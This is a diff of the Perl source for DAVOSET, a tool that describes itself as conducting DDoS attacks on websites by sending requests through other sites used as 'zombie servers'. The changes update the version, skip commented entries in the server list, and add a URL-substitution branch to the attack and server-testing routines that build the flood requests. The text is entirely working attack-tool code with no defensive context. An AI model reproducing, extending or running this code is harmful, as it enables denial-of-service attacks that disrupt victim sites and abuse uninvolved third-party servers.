@@ -1,13 +1,13 @@
 #!/usr/bin/perl
 # DDoS attacks via other sites execution tool
-# DAVOSET v.1.2.5
+# DAVOSET v.1.2.6
 # Tool for conducting of DDoS attacks on the sites via other sites
 # Copyright (C) MustLive 2010-2015
-# Last update: 30.06.2015
+# Last update: 30.10.2015
 # http://websecurity.com.ua
 #############################################
 # Settings
-my $version = "1.2.5"; # program version
+my $version = "1.2.6"; # program version
 my $agent = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1)"; # user agent
 my $default_port = "80"; # default port of the host
 my $show_stat = 1; # show statistic of work
@@ -76,7 +76,7 @@ open(FILE,"<$list_servers") || die "\nFile $list_servers not found.\n";
 close(FILE);
 foreach $item (@list) {
 	chomp($item);
-	if ($item) {
+	if ($item && substr($item,0,1) ne "#") {
 		$servers++;
 	}
 }
@@ -106,7 +106,7 @@ for ($cycle=0;$cycle<$cycles;$cycle++) {
 	$i = 0;
 	foreach $item (@list) {
 		chomp($item);
-		if ($item) {
+		if ($item && substr($item,0,1) ne "#") {
 			print ++$i."\n";
 			my ($url,$method,$file) = split /;/,$item;
 			if ($method eq "POST" or $method eq "XML" or $method eq "WP") {
@@ -244,6 +244,10 @@ sub Attack { # send request to zombie-server
 	else {
 		if ($url =~ m|^http://translate.yandex.net|) {
 			print $sock "GET $page$site/ HTTP/1.1\n";
+		}
+		elsif ($page =~ m|"http://site|) {
+			$page =~ s|"http://site|"$site|;
+			print $sock "GET $page HTTP/1.1\n";
 		}
 		else {
 			print $sock "GET $page$site HTTP/1.1\n";
@@ -385,6 +389,10 @@ sub TestServer { # test zombie-server
 	else {
 		if ($url =~ m|^http://translate.yandex.net|) {
 			print $sock "GET $page$site/ HTTP/1.1\n";
+		}
+		elsif ($page =~ m|"http://site|) {
+			$page =~ s|"http://site|"$site|;
+			print $sock "GET $page HTTP/1.1\n";
 		}
 		else {
 			print $sock "GET $page$site HTTP/1.1\n";
